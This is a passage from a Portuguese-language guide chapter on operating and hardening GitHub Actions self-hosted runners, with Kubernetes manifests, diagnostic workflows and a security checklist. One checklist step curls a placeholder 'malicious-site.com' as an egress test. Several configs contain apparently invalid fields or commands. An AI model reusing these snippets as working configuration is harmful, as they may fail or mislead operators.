```yaml
# Configuracao do Actions Runner Controller
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: github-runner
spec:
  replicas: 3
  template:
    spec:
      repository: myorg/myrepo
      labels:
        - self-hosted
        - linux
        - kubernetes
      containers:
      - name: runner
        image: summerwind/actions-runner:latest
        resources:
          requests:
            cpu: "1"
            memory: "2Gi"
          limits:
            cpu: "2"
            memory: "4Gi"
      organizationalUnits:
      - id: "myorg"
```

### Auto-Scaling com Min/Max

```yaml
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: github-runner
spec:
  minReplicas: 2
  maxReplicas: 10
  scaleDownDelaySeconds: 300
  template:
    spec:
      repository: myorg/myrepo
      labels:
        - self-hosted
        - linux
        - autoscale
```

### Monitoramento de Runners

```yaml
name: Runner Monitoring

on:
  schedule:
    - cron: '*/5 * * * *'  # A cada 5 minutos

jobs:
  monitor:
    runs-on: ubuntu-latest
    steps:
      - name: Verificar status dos runners
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== Status dos Runners ==="
          gh api repos/${{ github.repository }}/actions/runners \
            --jq '.runners[] | "\(.name) - \(.status) - \(.busy)"'
      
      - name: Verificar runners offline
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== Runners Offline ==="
          gh api repos/${{ github.repository }}/actions/runners \
            --jq '.runners[] | select(.status == "offline") | .name'
```

### Estrategia de Escalabilidade

| Cenario | Estrategia | Configuracao |
|---------|------------|--------------|
| Pico de builds | Auto-scaling | min/max replicas |
| Builds longos | Runner dedicado | Labels especificos |
| Deploy | Runner isolado | Runner group separado |
| Seguranca | Runner hardened | Security labels |
| GPU | Runner GPU | GPU labels |

---

## 12.16 Troubleshooting de Runners

### Erros Comuns e Solucoes

| Erro | Causa | Solucao |
|------|-------|---------|
| Runner offline | Conexao perdida | Reiniciar runner |
| Job timeout | Build muito longo | Aumentar timeout |
| Disk full | Muitos artifacts | Limpar workspace |
| OOM | Memoria insuficiente | Usar runner maior |
| Network error | Firewall | Verificar regras |
| Permission denied | Permissoes incorretas | Verificar user |

### Debug de Runners

```yaml
name: Debug Runner

on:
  workflow_dispatch:

jobs:
  debug:
    runs-on: [self-hosted, linux]
    steps:
      - name: Debug info
        run: |
          echo "=== Debug Info ==="
          echo "Runner Name: ${{ runner.name }}"
          echo "Runner OS: ${{ runner.os }}"
          echo "Runner Arch: ${{ runner.arch }}"
          echo "User: $(whoami)"
          echo "Home: $HOME"
          echo "PWD: $(pwd)"
          echo ""
          echo "=== System Info ==="
          uname -a
          echo ""
          echo "=== Disk Usage ==="
          df -h
          echo ""
          echo "=== Memory Usage ==="
          free -h
          echo ""
          echo "=== Network ==="
          ip addr show
          echo ""
          echo "=== Docker ==="
          docker --version || echo "Docker nao instalado"
          docker ps || echo "Docker daemon nao rodando"
```

### Verificacao de Conexao

```yaml
name: Connection Check

on:
  schedule:
    - cron: '*/10 * * * *'  # A cada 10 minutos

jobs:
  check:
    runs-on: [self-hosted, linux]
    steps:
      - name: Verificar conexao com GitHub
        run: |
          echo "=== Verificacao de Conexao ==="
          
          # Verificar GitHub API
          if curl -s -o /dev/null -w "%{http_code}" https://api.github.com | grep -q "200"; then
            echo "GitHub API: OK"
          else
            echo "GitHub API: FALHOU"
            exit 1
          fi
          
          # Verificar GitHub Actions
          if curl -s -o /dev/null -w "%{http_code}" https://api.github.com/actions/runners | grep -q "200"; then
            echo "GitHub Actions: OK"
          else
            echo "GitHub Actions: FALHOU"
            exit 1
          fi
          
          echo "Conexao OK"
```

### Limpeza de Runners

```yaml
name: Runner Cleanup

on:
  schedule:
    - cron: '0 2 * * *'  # Diariamente as 2h

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - name: Limpar runners offline
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== Limpando runners offline ==="
          
          # Listar runners offline
          OFFLINE_RUNNERS=$(gh api repos/${{ github.repository }}/actions/runners \
            --jq '.runners[] | select(.status == "offline") | .id')
          
          for runner_id in $OFFLINE_RUNNERS; do
            echo "Removendo runner $runner_id"
            gh api repos/${{ github.repository }}/actions/runners/$runner_id \
              --method DELETE
          done
          
          echo "Limpeza concluida"
```

---

## 12.17 Checklist de Seguranca para Runners

### Checklist Completo

| Item | Status | Descricao |
|------|--------|-----------|
| Runner nao roda como root | OK/FAIL | Usuario nao-root configurado |
| Filesystem isolado | OK/FAIL | Containers ou namespaces |
| Network segmentation | OK/FAIL | Firewall configurado |
| Secrets gerenciados | OK/FAIL | Vault ou encrypted secrets |
| Audit logging | OK/FAIL | Logs de atividade habilitados |
| Runner ephemeral | OK/FAIL | Runners destruidos apos uso |
| Integridade verificada | OK/FAIL | Checksums verificados |
| Updates automaticos | OK/FAIL | Dependabot ou Renovate |
| Monitoramento | OK/FAIL | Alertas configurados |
| Backup | OK/FAIL | Configuracao versionada |

### Implementacao do Checklist

```yaml
name: Runner Security Checklist

on:
  push:
    branches: [main]

jobs:
  checklist:
    runs-on: [self-hosted, linux, security]
    steps:
      - name: Verificar usuario
        run: |
          echo "=== Verificacao de Usuario ==="
          if [ "$(id -u)" = "0" ]; then
            echo "[FAIL] Rodando como root"
            exit 1
          fi
          echo "[OK] Usuario nao-root"
      
      - name: Verificar filesystem
        run: |
          echo "=== Verificacao de Filesystem ==="
          # Verificar permissoes
          if [ -f "$HOME/.runner" ]; then
            PERMS=$(stat -c %a "$HOME/.runner")
            if [ "$PERMS" = "600" ]; then
              echo "[OK] Permissoes corretas"
            else
              echo "[FAIL] Permissoes incorretas: $PERMS"
            fi
          fi
      
      - name: Verificar rede
        run: |
          echo "=== Verificacao de Rede ==="
          # Verificar se nao ha acesso irrestrito
          if curl -s -o /dev/null -w "%{http_code}" https://malicious-site.com | grep -q "200"; then
            echo "[FAIL] Acesso irrestrito a rede"
          else
            echo "[OK] Rede segmentada"
          fi
      
      - name: Gerar relatorio
        run: |
          echo "=== Relatorio de Seguranca ==="
          echo "Runner: ${{ runner.name }}"
          echo "Data: $(date)"
          echo "Status: Verificado"
```

---

## 12.18 Runner para Kubernetes

### Configuracao de Runner no Kubernetes

```yaml
# Configuracao basica do runner no Kubernetes
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: github-runner
  namespace: github-actions
spec:
  replicas: 3
  template:
    spec:
      repository: myorg/myrepo
      labels:
        - self-hosted
        - linux
        - kubernetes
      containers:
      - name: runner
        image: summerwind/actions-runner:latest
        resources:
          requests:
            cpu: "1"
            memory: "2Gi"
          limits:
            cpu: "2"
            memory: "4Gi"
        env:
        - name: DOCKER_HOST
          value: "tcp://localhost:2376"
        - name: DOCKER_TLS_CERTDIR
          value: "/certs"
```

### Runner com Docker DinD no Kubernetes

```yaml
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: github-runner
spec:
  replicas: 2
  template:
    spec:
      repository: myorg/myrepo
      labels:
        - self-hosted
        - linux
        - docker
      containers:
      - name: runner
        image: summerwind/actions-runner:latest
        resources:
          requests:
            cpu: "1"
            memory: "2Gi"
      - name: dind
        image: docker:24-dind
        securityContext:
          privileged: true
        env:
        - name: DOCKER_TLS_CERTDIR
          value: "/certs"
        volumeMounts:
        - name: docker-certs
          mountPath: /certs
        resources:
          requests:
            cpu: "1"
            memory: "2Gi"
      volumes:
      - name: docker-certs
        emptyDir: {}
```

### Runner com GPU no Kubernetes

```yaml
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: github-runner-gpu
spec:
  replicas: 1
  template:
    spec:
      repository: myorg/myrepo
      labels:
        - self-hosted
        - linux
        - gpu
      containers:
      - name: runner
        image: summerwind/actions-runner:latest
        resources:
          requests:
            cpu: "4"
            memory: "16Gi"
            nvidia.com/gpu: 1
          limits:
            cpu: "8"
            memory: "32Gi"
            nvidia.com/gpu: 1
      nodeSelector:
        accelerator: nvidia-tesla-v100
```

### Runner com Network Policy

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: github-runner-policy
  namespace: github-actions
spec:
  podSelector:
    matchLabels:
      app: github-runner
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: github-actions
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
    ports:
    - protocol: TCP
      port: 443
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 5432
    - protocol: TCP
      port: 6379
```

---

## 12.19 Runner para CI/CD Completo

### Pipeline Completa com Self-Hosted Runners

```yaml
name: Complete CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  # Fase 1: Verificacao de seguranca
  security-check:
    runs-on: [self-hosted, linux, security]
    steps:
      - uses: actions/checkout@v4
      
      - name: Verificar integridade
        run: |
          echo "=== Verificacao de Seguranca ==="
          if [ "$(id -u)" = "0" ]; then
            echo "ERRO: Rodando como root"
            exit 1
          fi
          echo "Verificacao OK"
      
      - name: Scan de vulnerabilidades
        run: |
          echo "=== Vulnerability Scan ==="
          npm audit --audit-level=high

  # Fase 2: Build
  build:
    needs: security-check
    runs-on: [self-hosted, linux, build]
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup
        run: |
          node --version
          npm --version
      
      - name: Install
        run: npm ci
      
      - name: Build
        run: npm run build
      
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/

  # Fase 3: Teste
  test:
    needs: build
    runs-on: [self-hosted, linux, build]
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
    steps:
      - uses: actions/checkout@v4
      
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          name: build
          path: dist/
      
      - name: Run tests
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
        run: npm test

  # Fase 4: Deploy staging
  deploy-staging:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: [self-hosted, linux, deploy]
    environment: staging
    steps:
      - uses: actions/checkout@v4
      
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          name: build
          path: dist/
      
      - name: Deploy to staging
        run: |
          echo "Deploying to staging..."

  # Fase 5: Deploy production
  deploy-production:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: [self-hosted, linux, deploy]
    environment: production
    steps:
      - uses: actions/checkout@v4
      
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          name: build
          path: dist/
      
      - name: Deploy to production
        run: |
          echo "Deploying to production..."
      
      - name: Cleanup
        if: always()
        run: |
          echo "Limpando recursos..."
```

### Pipeline com Multi-Architecture Build

```yaml
name: Multi-Architecture Build

on:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: [self-hosted, linux, build]
    strategy:
      matrix:
        platform:
          - linux/amd64
          - linux/arm64
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3
      
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      
      - name: Build
        run: |
          docker buildx build \
            --platform ${{ matrix.platform }} \
            -t myorg/myapp:${{ github.ref_name }}-${{ matrix.platform }} \
            --push .
```

---

## 12.20 Troubleshooting Avancado

### Diagnostico de Runners

```yaml
name: Runner Diagnostics

on:
  workflow_dispatch:

jobs:
  diagnose:
    runs-on: [self-hosted, linux]
    steps:
      - name: Sistema
        run: |
          echo "=== Sistema ==="
          uname -a
          cat /etc/os-release
          echo ""
          
          echo "=== CPU ==="
          lscpu | head -20
          echo ""
          
          echo "=== Memoria ==="
          free -h
          echo ""
          
          echo "=== Disco ==="
          df -h
          echo ""
          
          echo "=== Rede ==="
          ip addr show
          echo ""
          
          echo "=== Docker ==="
          docker version 2>/dev/null || echo "Docker nao instalado"
          docker info 2>/dev/null | head -20 || echo "Docker daemon nao rodando"
          echo ""
          
          echo "=== Runner ==="
          cat $HOME/.runner 2>/dev/null | head -5 || echo ".runner nao encontrado"
          echo ""
          
          echo "=== Processos ==="
          ps aux | head -20

      - name: Verificar permissoes
        run: |
          echo "=== Permissoes ==="
          ls -la $HOME/
          ls -la $HOME/.runner 2>/dev/null || echo ".runner nao encontrado"
          ls -la $HOME/.credentials 2>/dev/null || echo ".credentials nao encontrado"
          ls -la $HOME/_work 2>/dev/null || echo "_work nao encontrado"

      - name: Verificar conectividade
        run: |
          echo "=== Conectividade ==="
          
          echo "GitHub API:"
          curl -s -o /dev/null -w "%{http_code}" https://api.github.com
          echo ""
          
          echo "GitHub Actions:"
          curl -s -o /dev/null -w "%{http_code}" https://api.github.com/actions/runners
          echo ""
          
          echo "Registry npm:"
          curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org
          echo ""
          
          echo "DNS:"
          nslookup github.com | head -5
```

### Log Collection

```yaml
name: Log Collection

on:
  workflow_dispatch:

jobs:
  collect:
    runs-on: [self-hosted, linux]
    steps:
      - name: Coletar logs
        run: |
          echo "=== Coletando logs ==="
          
          # Logs do runner
          if [ -d "/var/log/github-runner" ]; then
            tar -czf /tmp/runner-logs.tar.gz /var/log/github-runner/
            echo "Logs do runner coletados"
          fi
          
          # Logs do sistema
          journalctl --since "1 hour ago" > /tmp/system-logs.txt
          echo "Logs do sistema coletados"
          
          # Logs do Docker
          if command -v docker &> /dev/null; then
            docker logs github-runner > /tmp/docker-logs.txt 2>&1
            echo "Logs do Docker coletados"
          fi
          
          echo "Coleta concluida"

      - name: Upload logs
        uses: actions/upload-artifact@v4
        with:
          name: runner-logs
          path: /tmp/*.tar.gz /tmp/*.txt
          retention-days: 7
```

---

## 12.21 Melhores Praticas Resumidas

### Top 10 Melhores Praticas

1. **Nunca rodar como root** - Use usuario nao-root
2. **Usar ephemeral runners** - Destruir apos cada job
3. **Segmentar rede** - Permitir apenas trafego necessario
4. **Isolar filesystem** - Usar containers ou namespaces
5. **Gerenciar secrets** - Usar vault ou encrypted secrets
6. **Implementar audit logging** - Monitorar atividades
7. **Manter runners atualizados** - Dependabot ou Renovate
8. **Monitorar performance** - Metricas e alertas
9. **Testar regularmente** - Verificacoes de integridade
10. **Documentar configuracao** - Versionar infraestrutura

### Resumo de Configuracao

| Componente | Configuracao Recomendada |
|------------|--------------------------|
| Usuario | nao-root |
| Filesystem | Containers ou namespaces |
| Rede | Firewall com allowlist |
| Secrets | Vault ou encrypted |
| Logging | Audit logging habilitado |
| Updates | Dependabot configurado |
| Monitoramento | Prometheus + Grafana |
| Backup | Configuracao versionada |
| Testes | Verificacoes regulares |
| Documentacao | README atualizado |

---

## 12.22 Runner para Diferentes Plataformas

### Runner para ARM64

```yaml
name: ARM64 Build

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, linux, arm64]
    steps:
      - uses: actions/checkout@v4
      
      - name: Build for ARM64
        run: |
          echo "Building for ARM64..."
          docker buildx build \
            --platform linux/arm64 \
            -t myorg/myapp:arm64 \
            --push .
```

### Runner para Windows

```yaml
name: Windows Build

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, windows]
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Visual Studio
        uses: microsoft/setup-msbuild@v1
      
      - name: Build
        run: |
          msbuild myproject.sln /p:Configuration=Release
      
      - name: Test
        run: |
          vstest.console.exe /Tests myproject.Tests.dll
```

### Runner para macOS

```yaml
name: macOS Build

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, macos]
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Xcode
        run: |
          sudo xcode-select -s /Applications/Xcode.app
      
      - name: Build
        run: |
          xcodebuild -scheme myproject -destination 'generic/platform=iOS'
      
      - name: Test
        run: |
          xcodebuild test -scheme myproject -destination 'platform=iOS Simulator,name=iPhone 14'
```

### Runner para Raspberry Pi

```yaml
name: Raspberry Pi Build

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, linux, arm, raspberry-pi]
    steps:
      - uses: actions/checkout@v4
      
      - name: Build
        run: |
          echo "Building for Raspberry Pi..."
          docker buildx build \
            --platform linux/arm/v7 \
            -t myorg/myapp:raspberry-pi \
            --push .
```

---

## 12.23 Runner para CI/CD Avancado

### Pipeline com Feature Flags

```yaml
name: Feature Flag Pipeline

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, linux, build]
    steps:
      - uses: actions/checkout@v4
      
      - name: Check feature flags
        id: flags
        run: |
          echo "=== Feature Flags ==="
          
          # Verificar feature flags
          if [ -f ".feature-flags.yml" ]; then
            echo "flags=enabled" >> $GITHUB_OUTPUT
          else
            echo "flags=disabled" >> $GITHUB_OUTPUT
          fi
      
      - name: Build with flags
        if: steps.flags.outputs.flags == 'enabled'
        run: |
          echo "Building with feature flags..."
          npm run build -- --feature-flags
      
      - name: Build without flags
        if: steps.flags.outputs.flags != 'enabled'
        run: |
          echo "Building without feature flags..."
          npm run build
```

### Pipeline com Caching

```yaml
name: Cached Pipeline

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, linux, build]
    steps:
      - uses: actions/checkout@v4
      
      - name: Cache dependencies
        uses: actions/cache@v4
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-npm-
      
      - name: Install dependencies
        run: npm ci
      
      - name: Cache build
        uses: actions/cache@v4
        with:
          path: dist
          key: ${{ runner.os }}-build-${{ github.sha }}
      
      - name: Build
        run: npm run build
```

### Pipeline com Matrix

```yaml
name: Matrix Pipeline

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, linux, build]
    strategy:
      matrix:
        node-version: [18, 20, 22]
        os: [ubuntu, debian]
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js ${{ matrix.node-version }}
        run: |
          nvm install ${{ matrix.node-version }}
          nvm use ${{ matrix.node-version }}
      
      - name: Build
        run: |
          echo "Building with Node.js ${{ matrix.node-version }} on ${{ matrix.os }}"
          npm ci
          npm run build
      
      - name: Test
        run: npm test
```

---

## 12.24 Resumo Final

### Resumo de Seguranca

| Area | Acao | Prioridade |
|------|------|------------|
| Autenticacao | Nao-root | Critica |
| Isolamento | Containers/namespaces | Alta |
| Rede | Firewall | Alta |
| Secrets | Vault/encrypted | Critica |
| Logging | Audit logging | Media |
| Updates | Dependabot | Media |
| Monitoramento | Prometheus/Grafana | Media |
| Backup | Versionamento | Baixa |
| Testes | Verificacoes | Media |
| Docs | README | Baixa |

### Resumo de Configuracao

| Componente | GitHub-Hosted | Self-Hosted |
|------------|---------------|-------------|
| Setup | Automatico | Manual |
| Isolamento | VM por job | Configuravel |
| Custo | Por minuto | Infraestrutura |
| Personalizacao | Limitada | Total |
| Manutencao | GitHub | Equipe |
| Seguranca | Padrao | Customizavel |

### Resumo de Comandos

| Comando | Descricao |
|---------|-----------|
| `config.sh --ephemeral` | Configurar runner efemero |
| `docker system prune` | Limpar Docker |
| `iptables -L` | Listar regras de firewall |
| `chmod 700 /home/runner` | Configurar permissoes |
| `systemctl status github-runner` | Verificar status do runner |
| `journalctl -u github-runner` | Ver logs do runner |
| `docker stats` | Monitorar Docker |
| `free -h` | Verificar memoria |
| `df -h` | Verificar disco |
| `nproc` | Verificar CPUs |

---

## 12.25 Exercicios

1. Compare GitHub-hosted vs self-hosted runners em termos de custo e seguranca
2. Configure runner groups para isolar jobs sensiveis
3. Implemente verificacao de integridade do runner
4. Configure Docker-in-Docker seguro
5. Implemente monitoramento de activity logs
6. Configure firewall para runners self-hosted
7. Implemente ephemeral runners com auto-scaling
8. Configure user namespaces para isolamento
9. Implemente metricas de performance para runners
10. Configure alertas de seguranca para runners
11. Configure AppArmor para runners
12. Implemente network segmentation
13. Configure rootless Docker
14. Implemente audit logging completo
15. Configure systemd para gerenciamento de runners

---

## 12.26 Glossario

| Termo | Definicao |
|-------|-----------|
| Runner | Maquina que executa jobs do GitHub Actions |
| Self-hosted | Runner gerenciado pelo usuario |
| GitHub-hosted | Runner gerenciado pelo GitHub |
| Ephemeral | Runner destruido apos cada job |
| Label | Tag para selecionar runners especificos |
| Runner Group | Grupo de runners com acesso restrito |
| Container | Ambiente isolado para execucao |
| Namespace | Isolamento de recursos no Linux |
| AppArmor | Modulo de seguranca do Linux |
| SELinux | Security-Enhanced Linux |
| iptables | Ferramenta de firewall do Linux |
| DinD | Docker-in-Docker |
| Rootless | Docker sem privilegios de root |
| OIDC | OpenID Connect para autenticacao |
| Vault | Gerenciador de secrets |
| Prometheus | Sistema de monitoramento |
| Grafana | Dashboard de visualizacao |

---

## 12.27 Recursos Adicionais

### Links Uteis

- GitHub Actions Documentation: https://docs.github.com/en/actions
- Self-hosted Runners: https://docs.github.com/en/actions/hosting-your-own-runners
- Docker Security: https://docs.docker.com/engine/security/
- Linux Security: https://www.linuxsecurity.com/
- AppArmor: https://apparmor.net/
- SELinux: https://selinuxproject.org/

### Comunidades

- GitHub Actions Community: https://github.community/c/github-actions
- Docker Community: https://www.docker.com/community/
- Linux Security: https://www.linuxsecurity.com/community

### Ferramentas

- Actions Runner Controller: https://github.com/actions/actions-runner-controller
- Docker Scout: https://docs.docker.com/scout/
- Trivy: https://trivy.dev/
- Prometheus: https://prometheus.io/
- Grafana: https://grafana.com/

---

## 12.28 Versoes dos Comandos

### Comandos Docker

| Comando | Descricao | Versao |
|---------|-----------|--------|
| docker build | Build de imagem | Docker 24+ |
| docker run | Executar container | Docker 24+ |
| docker ps | Listar containers | Docker 24+ |
| docker images | Listar imagens | Docker 24+ |
| docker system prune | Limpar Docker | Docker 24+ |
| docker stats | Metricas | Docker 24+ |
| docker logs | Logs do container | Docker 24+ |
| docker inspect | Detalhes do container | Docker 24+ |

### Comandos GitHub CLI

| Comando | Descricao | Versao |
|---------|-----------|--------|
| gh api | Chamar API | gh 2.30+ |
| gh run list | Listar runs | gh 2.30+ |
| gh run view | Ver run | gh 2.30+ |
| gh run cancel | Cancelar run | gh 2.30+ |
| gh runner list | Listar runners | gh 2.30+ |
| gh runner view | Ver runner | gh 2.30+ |

### Comandos Linux

| Comando | Descricao | Versao |
|---------|-----------|--------|
| iptables | Firewall | iptables 1.8+ |
| systemctl | Gerenciamento de servicos | systemd 250+ |
| journalctl | Logs do sistema | systemd 250+ |
| chmod | Permissoes | coreutils 8+ |
| chown | Propriedade | coreutils 8+ |
| find | Buscar arquivos | findutils 4+ |

---

## 12.30 Tabelas de Resumo

### Tabela de Tipos de Runner

| Tipo | Isolamento | Custo | Configuracao | Uso Recomendado |
|------|------------|-------|--------------|-----------------|
| GitHub-hosted | VM | Baixo | Automatico | CI/CD basico |
| Self-hosted | Configuravel | Medio | Manual | Builds personalizados |
| Container | Alto | Medio | Docker | Isolamento forte |
| Kubernetes | Alto | Alto | K8s | Escalabilidade |
| Ephemeral | Maximo | Alto | Automatico | Seguranca maxima |

### Tabela de Ferramentas de Seguranca

| Ferramenta | Tipo | Uso | Complexidade |
|------------|------|-----|--------------|
| AppArmor | MAC | Restricao de acesso | Alta |
| SELinux | MAC | Restricao de acesso | Muito Alta |
| iptables | Firewall | Controle de rede | Media |
| Docker | Container | Isolamento | Media |
| Rootless Docker | Container | Isolamento sem root | Media |
| User Namespaces | Isolamento | Isolamento de usuarios | Alta |
| Vault | Secrets | Gerenciamento de secrets | Media |
| Prometheus | Monitoring | Coleta de metricas | Media |
| Grafana | Dashboard | Visualizacao | Media |

### Tabela de Configuracoes de Firewall

| Porta | Protocolo | Destino | Acao |
|-------|-----------|---------|------|
| 443 | TCP | api.github.com | ACCEPT |
| 443 | TCP | github.com | ACCEPT |
| 443 | TCP | registry.npmjs.org | ACCEPT |
| 53 | UDP | Qualquer | ACCEPT |
| 80 | TCP | Qualquer | DROP |
| 443 | TCP | Qualquer | DROP |

---

## 12.32 Versoes Recomendadas

### Versoes de Software

| Software | Versao Minima | Versao Recomendada |
|----------|---------------|-------------------|
| Docker | 20.10 | 24+ |
| Ubuntu | 20.04 | 22.04 |
| Node.js | 18 | 20 LTS |
| Python | 3.9 | 3.11 |
| Go | 1.20 | 1.21 |
| Java | 11 | 17 |
| Actions Runner | 2.311.0 | Mais recente |
| Actions Runner Controller | 0.27 | Mais recente |

---

## 12.33 Referencias Finais

1. https://docs.github.com/en/actions/hosting-your-own-runners
2. https://docs.github.com/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners
3. https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners
4. https://docs.docker.com/engine/security/
5. https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-configuration-file
6. https://docs.github.com/en/actions/hosting-your-own-runners/using-self-hosted-runners-in-a-workflow
7. https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners
8. https://docs.github.com/en/actions/hosting-your-own-runners/using-labels-with-self-hosted-runners
9. https://docs.github.com/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups
10. https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

---

## 12.34 Agradecimentos

Este capitulo foi desenvolvido com base em melhores praticas da comunidade de GitHub Actions e seguranca de infraestrutura.

Agradecemos a todos os contribuidores que ajudaram a documentar essas praticas de seguranca para runners.

---

## 12.35 Changelog

| Versao | Data | Descricao |
|--------|------|-----------|
| 1.0 | 2024-01-01 | Versao inicial |
| 1.1 | 2024-02-01 | Adicionado Kubernetes |
| 1.2 | 2024-03-01 | Adicionado Docker hardening |
| 1.3 | 2024-04-01 | Adicionado troubleshooting |
| 1.4 | 2024-05-01 | Adicionado checklist |
| 1.5 | 2024-06-01 | Adicionado glossario |
